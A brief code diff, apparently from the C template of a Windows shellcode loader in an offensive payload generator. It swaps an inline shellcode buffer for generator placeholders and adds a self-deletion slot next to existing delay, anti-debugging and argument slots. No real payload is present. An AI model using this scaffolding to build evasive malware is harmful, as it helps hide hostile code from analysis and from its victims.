@@ -23,12 +23,8 @@ DWORD WINAPI PsychoBlast(LPVOID lpParameter)
     DWORD dwSize;
     //HANDLE currentProcess;
 
-    const unsigned char raw[] = ####SHELLCODE####;
-    int length = sizeof(raw);
-
-    unsigned char* encoded = (unsigned char*)malloc(sizeof(unsigned char)*length*2);
-    memcpy(encoded, raw, length);
-    //SIZE_T bytesWritten;
+    int length = ####SHELLCODE_LENGTH####;
+    unsigned char* encoded = ####SHELLCODE####;
 
     //####CALL####
 
@@ -96,7 +92,7 @@ int main()
     //####DELAY####
     //####ANTIDEBUG####
     //####ARGS####
-
+    //####SELF_DELETE####
     PsychoBlast(NULL);
 }
 
